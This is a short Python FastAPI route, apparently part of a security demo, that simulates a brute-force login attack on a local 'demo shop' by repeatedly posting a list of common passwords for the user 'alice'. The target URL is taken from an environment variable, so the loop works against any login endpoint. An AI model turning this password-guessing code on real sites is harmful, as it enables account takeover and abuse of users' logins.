from fastapi import APIRouter
import requests, os

router = APIRouter()

COMMON_PWS = ["secret", "password", "123456", "ilikepizza"]

@router.post("/simulate/demo-shop-attack")
def attack(payload: dict):
    attempts = payload.get("attempts", 50)
    shop_url = os.getenv("DEMO_SHOP_URL", "http://localhost:3005")
    results = []
    for _ in range(attempts):
        for pw in COMMON_PWS:
            r = requests.post(f"{shop_url}/login", json={"username":"alice","password":pw})
            results.append({"password": pw, "status": r.status_code})
    return {"results": results}
